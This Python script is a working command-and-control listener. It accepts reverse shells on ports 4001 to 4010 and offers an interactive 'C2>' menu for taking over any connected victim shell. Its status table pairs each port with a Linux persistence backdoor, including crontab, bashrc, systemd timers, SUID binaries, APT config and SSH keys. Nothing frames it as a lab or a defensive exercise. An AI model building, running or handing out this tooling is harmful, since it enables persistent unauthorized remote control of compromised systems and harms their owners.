import socket
import threading
import sys
import time
import select

# Config
PORTS = range(4001, 4011) # 4001 to 4010
HOST = '0.0.0.0'

# State
connections = {} # port -> client_socket
status = {p: "Waiting..." for p in PORTS}
active_interaction = None

def listen_port(port):
    global active_interaction
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind((HOST, port))
        s.listen(1)
        # update_status(port, "Listening")
        
        while True:
            conn, addr = s.accept()
            connections[port] = conn
            status[port] = f"Connected ({addr[0]})"
            
            # Keep alive loop or just hold connection
            # If we are not interacting, we just let it sit?
            # Reverse shells typically hang until input.
            
            while True:
                # Check if connection is dead
                try:
                    if port not in connections:
                         break

                    # Non-blocking check?
                    if active_interaction != port:
                        time.sleep(0.5)
                        continue
                        
                    # If this port is active, logic is handled by 'interact' function
                    # We just wait here until it's released or closed
                except:
                    break
            
            # If loop breaks, cleanup
            try: connections[port].close()
            except: pass
            connections.pop(port, None)
            status[port] = "Waiting..."
            
    except Exception as e:
        status[port] = f"Error: {e}"

def interact(port):
    global active_interaction
    if port not in connections:
        print(f"[-] No connection on port {port}")
        return

    # Auto-kill other connections
    active_ports = list(connections.keys())
    for p in active_ports:
        if p != port:
            print(f"[*] Auto-killing unused connection on Port {p}...")
            try:
                # Closing and removing will trigger the thread loop to break
                c = connections[p]
                del connections[p] 
                c.close()
            except:
                pass

    conn = connections[port]
    print(f"[*] Switching to Interactive Mode on Port {port}...")
    print("[*] Press Ctrl+C to detach (return to menu), Ctrl+D to close shell.")
    
    active_interaction = port
    conn.setblocking(0)
    
    import termios
    import tty
    
    # Save original tty settings
    old_tty = termios.tcgetattr(sys.stdin)
    
    try:
        tty.setraw(sys.stdin.fileno())
        
        while True:
            r, w, e = select.select([conn, sys.stdin], [], [])
            
            if conn in r:
                try:
                    data = conn.recv(4096)
                    if not data: break
                    # Fix stair-stepping in raw mode: Replace \n with \r\n
                    decoded = data.decode(errors='ignore')
                    sys.stdout.write(decoded.replace('\n', '\r\n'))
                    sys.stdout.flush()
                except:
                    break
            
            if sys.stdin in r:
                chunk = sys.stdin.read(1)
                # Check for Detach (Ctrl+C = \x03)
                if chunk == '\x03':
                    break
                
                conn.send(chunk.encode())
                
    except Exception as e:
        pass
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
        active_interaction = None
        print(f"\n[*] Detached from Port {port}.")

def print_status():
    print("\n" + "="*40)
    print(f"{'Port':<8} | {'Method':<20} | {'Status'}")
    print("-" * 40)
    methods = [
        "SUID Binary", "Crontab", "Bashrc", "If-Up", 
        "Systemd User", "Systemd Timer", "MOTD", 
        "Autostart", "APT Config", "SSH Key"
    ]
    for i, p in enumerate(PORTS):
        m = methods[i] if i < len(methods) else "Unknown"
        s = status.get(p, "Unknown")
        print(f"{p:<8} | {m:<20} | {s}")
    print("="*40)

def main():
    print("[*] Starting Multi-Port Listener...")
    
    # Start threads
    threads = []
    for p in PORTS:
        t = threading.Thread(target=listen_port, args=(p,))
        t.daemon = True
        t.start()
        threads.append(t)
        
    time.sleep(1) # Let sockets bind
    
    # Command Loop
    while True:
        try:
            print_status()
            print("\nCommands: interact <port> | kill <port> | quit")
            cmd = input("C2> ").strip().split()
            
            if not cmd: continue
            
            if cmd[0] == 'quit':
                break
            
            if cmd[0] == 'interact':
                if len(cmd) < 2: continue
                try:
                    p = int(cmd[1])
                    interact(p)
                except ValueError:
                     print("Invalid port")
            
            if cmd[0] == 'kill':
                if len(cmd) < 2: continue
                try:
                    p = int(cmd[1])
                    if p in connections:
                        connections[p].close()
                        del connections[p]
                        print(f"[*] Killed connection on {p}")
                except: pass
                
        except KeyboardInterrupt:
            break
            
    print("[*] Exiting.")

if __name__ == "__main__":
    main()
